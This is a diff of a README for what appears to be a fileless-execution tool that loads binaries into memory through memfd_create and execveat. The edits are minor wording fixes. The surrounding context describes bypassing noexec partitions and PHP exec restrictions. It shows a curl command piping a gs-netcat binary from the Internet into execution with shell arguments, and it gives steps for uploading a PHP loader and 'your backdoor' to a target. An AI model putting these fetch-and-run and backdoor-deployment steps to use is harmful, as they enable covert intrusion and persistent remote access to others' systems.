@@ -7,7 +7,7 @@ Use _one_ of the 3 scripts (perl, bash, php):
 - The binary does not need to have +x
 - The binary can reside on a noexec-partition
 - Mostly the binary can be piped directly from the Internet into the memory (and executed there)
-- Works as non-root users
+- Works as non-root user
 - The PHP variant also circumvents PHP's "exec" restrictions.
 - It injects shellcode into the running process and calls [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) and [execveat(2)](https://man7.org/linux/man-pages/man2/execveat.2.html) to load a binary from a noexec-partition (or directly from the Internet).
 - BASH and PHP do not support SYSCALLS. We advanced an old trick.
@@ -35,7 +35,7 @@ curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilDq -
 The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).
 
 1. Upload `memexec.php` and `egg` (your backdoor) onto the target
-2. Call `curl -SsfL https://target/memexec.php` to execute `egg`
+2. Call `curl -SsfL https://target/memexec.php` will execute `egg`
 
 ---
 
